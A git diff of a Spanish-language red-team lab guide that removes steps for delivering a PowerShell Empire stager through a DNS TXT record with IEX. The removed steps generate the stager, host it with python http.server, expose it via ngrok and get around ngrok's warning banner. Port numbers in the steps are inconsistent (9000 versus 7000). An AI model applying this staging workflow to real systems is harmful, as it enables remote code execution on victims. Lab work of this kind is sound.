@@ -6,7 +6,7 @@ Requisitos:
 2. Máquina ***Kali Linux***.
 3. Máquina ***Win 11***.
 
-TODO. introducción
+TODO. Repasar todo. para powershell empire ver si esto tiene sentido: https://crypt0jan.medium.com/red-team-tutorials-3-351e76ea796d si no funciona eliminar la parte de empire del lab.
 
 ## Ejercicio 1: Hacer prueba de concepto con registro TXT.
 
@@ -279,103 +279,4 @@ kill <Nombre_Agente>
 ![Eliminar Agente](../img/lab-50-C/202209151158.png)
 
 Para que la técnica de evasión funcione debemos dividir el ataque en dos partes.
-
-* *1*. Crear un registro TXT que use ***IEX*** y descargue el stager desde una ubicación accesible para la víctima, es decir, un servidor web. Nota: ***IEX*** es un alias del comando ***Invoke-Expression*** que permite que ***PowerShell*** ejecute un script.
-* *2*. Crear el servidor web que contendrá el código del ***Stager***.
-
-El ataque se producirá ejecutando en la víctima una shell de ***PowerShell*** de descargue el TXT y ejecute su contenido, como ya vimos al principio de este laboratorio.
-
-Procedemos a crear un servidor web que sirva una página web con el contenido del stager. Como es muy probable que lo hayamos perdido, vamos a regenerarlo.
-
-En la máquina ***Kali***, en la consola de ***PowerShell Empire*** (client), escribimos los  siguientes comandos.
-Nota: El puerto sigue configurado, por lo que no hay que ponerlo.
-```
-use Listener http
-```
-```
-usestager multi/launcher
-```
-```
-execute
-```
-
-Actualmente tenemos al ***Stager*** nuevamente copiado en el portapapeles.
-
-En una nueva terminal, creamos un un directorio de trabajo para montar el servidor web.
-```
-mkdir -p ~/webserver
-
-cd ~/webserver
-```
-
-Creamos con ***nano*** un archivo en ese directorio que contendrá el stager.
-```
-nano index.tml
-```
-
-En nano pegamos el stager, que debería seguir copiado en el portapapeles. A continuación guardamos y salimos (***CTRL+X***, ***Y*** y ***Enter***)
-
-Ahora levantamos un servidor web para servir el stager en el puerto ***9000***.
-```
-python3 -m http.server 9000
-```
-
-En una nueva terminal, ejecutamos el siguiente comando para determinar si se está sirviendo correctament el stager.
-```
-curl localhost:9000
-```
-
-Hasta el momento estamos trabajando en el entorno de laboratori donde víctima y atacante conviven. En el mundo real, esto no es así. De esta forma, vamos a mejorar el laboratorio simulando algo más real. 
-
-Ubicaremos el servidor que sirve el stager en Internet. Esto no es del todo cierto, el servidor seguirá siendo el que tenemos ***localhost:9000*** pero usaremos ***ngrok*** para publicar el servicio en Internet.
-```
-ngrok http 7000
-```
-
-Con esto hacemos visible en Internet nuestro servidor de staging.
-
-![ngrok forwarding](../img/lab-50-C/202209151255.png)
-
-Nota: La versión de comunidad de ngrok muestra un banner como el siguiente.
-
-![ngrok warning](../img/lab-50-C/202209151305.png)
-
-La idea es obligarte a subscribir el producto de pago, para que el forwarding funcione correctamente. Afortunadamente esto solo se produce en la primera conexión del navagedador. ***Ngrok*** registra la IP y para las siguientes peticiones hace ya el forwading directamente.
-
-Cuando vayamos a realizar el ataque, tendremos en cuenta esto y haremos una conexión inicial desde el navegador predeterminado de la victima para saltarnos esta restricción.
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
